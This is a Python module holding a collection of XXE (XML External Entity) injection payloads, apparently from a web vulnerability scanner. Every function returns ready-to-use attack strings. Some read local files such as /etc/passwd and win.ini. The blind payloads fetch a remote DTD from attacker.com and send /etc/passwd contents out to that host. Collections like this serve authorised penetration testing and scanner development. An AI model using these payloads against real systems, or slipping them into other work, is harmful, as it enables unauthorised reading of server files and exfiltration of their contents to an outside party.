"""
XXE (XML External Entity) payload collection
"""

from typing import List

class XXEPayloads:
    """XXE payload collection"""
    
    @staticmethod
    def get_basic_payloads() -> List[str]:
        """Get basic XXE payloads"""
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hosts">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]><foo>&xxe;</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///c:/boot.ini">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://attacker.com/evil.dtd">]><foo>&xxe;</foo>'
        ]
    
    @staticmethod
    def get_blind_payloads() -> List[str]:
        """Get blind XXE payloads"""
        return [
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd"> %xxe;]><foo>test</foo>',
            '<!DOCTYPE foo [<!ENTITY % file SYSTEM "file:///etc/passwd"><!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM \'http://attacker.com/?x=%file;\'>">%eval;%exfil;]><foo>test</foo>',
            '<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;]><foo>test</foo>'
        ]
    
    @staticmethod
    def get_parameter_payloads() -> List[str]:
        """Get XXE payloads for parameters"""
        return [
            '<!ENTITY xxe SYSTEM "file:///etc/passwd">',
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            'file:///etc/passwd',
            'file:///c:/windows/win.ini'
        ]
    
    @staticmethod
    def get_all_payloads() -> List[str]:
        """Get all XXE payloads"""
        payloads = []
        payloads.extend(XXEPayloads.get_basic_payloads())
        payloads.extend(XXEPayloads.get_blind_payloads())
        payloads.extend(XXEPayloads.get_parameter_payloads())
        return payloads
